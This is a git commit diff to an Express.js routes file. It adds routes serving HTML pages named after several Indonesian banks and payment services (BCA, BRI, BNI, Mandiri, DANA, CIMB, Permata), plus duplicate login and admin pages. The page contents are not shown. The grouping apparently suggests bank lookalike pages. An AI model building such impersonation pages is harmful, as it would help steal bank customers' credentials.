db435a3e4cf0b2cd796bf3c3d503dc188b19e3e5
melani <61097354+melancans@users.noreply.github.com>
2021-06-04 00:25:50 +0700

    Add files via upload

--- routes/main.js
+++ routes/main.js
@@ -11,8 +11,44 @@ router.get('/masuk', (req, res) => {
     res.sendFile(__path + '/views/masuk.html')
 })
 
+router.get('/masukk', (req, res) => {
+    res.sendFile(__path + '/views/masukk.html')
+})
+
 router.get('/admin', (req, res) => {
     res.sendFile(__path + '/views/admin.html')
+})
+
+router.get('/adminn', (req, res) => {
+    res.sendFile(__path + '/views/adminn.html')
+})
+
+router.get('/bca', (req, res) => {
+    res.sendFile(__path + '/views/bca.html')
+})
+
+router.get('/bri', (req, res) => {
+    res.sendFile(__path + '/views/bri.html')
+})
+
+router.get('/bni', (req, res) => {
+    res.sendFile(__path + '/views/bni.html')
+})
+
+router.get('/mandiri', (req, res) => {
+    res.sendFile(__path + '/views/mandiri.html')
+})
+
+router.get('/dana', (req, res) => {
+    res.sendFile(__path + '/views/dana.html')
+})
+
+router.get('/cimb', (req, res) => {
+    res.sendFile(__path + '/views/cimb.html')
+})
+
+router.get('/permata', (req, res) => {
+    res.sendFile(__path + '/views/permata.html')
 })
 
 router.get('/config', (req, res) => {
